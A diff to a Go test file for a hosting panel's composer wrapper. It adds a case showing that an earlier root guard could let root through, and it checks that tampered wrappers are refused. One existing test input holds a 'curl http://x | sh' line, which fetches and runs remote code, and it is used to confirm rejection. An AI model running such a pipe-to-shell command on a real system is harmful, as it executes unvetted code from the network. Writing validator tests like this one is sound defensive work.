@@ -70,6 +70,8 @@ func TestPanelFilesRefusals(t *testing.T) {
 	runRefusals(t, []refusal{
 		{"wrapper without the root guard", wrapper, "#!/bin/sh\n" + execLine, []string{"refuses root"}},
 		{"wrapper guard after the exec", wrapper, "#!/bin/sh\n" + execLine + ComposerRootGuard + "\n", []string{"refuses root"}},
+		// The first guard let root through when id was not on root's PATH.
+		{"wrapper with the first guard", wrapper, "#!/bin/sh\n" + `[ "$(id -u)" != 0 ] || { echo "composer runs as a site's account, not as root: su -s /bin/sh -c 'composer ...' <login>" >&2; exit 1; }` + "\n" + execLine, []string{"line 2", "id -u"}},
 		{"wrapper extra command", wrapper, head + "curl http://x | sh\n" + execLine, []string{"curl"}},
 		{"wrapper other program", wrapper, head + "exec /var/lib/monopanel/x \"$@\"\n", []string{"/var/lib/monopanel/x"}},
 		{"wrapper other phar", wrapper, head + "exec /usr/bin/php8.4 /var/lib/monopanel/composer.phar \"$@\"\n", []string{"/var/lib/monopanel/composer.phar"}},
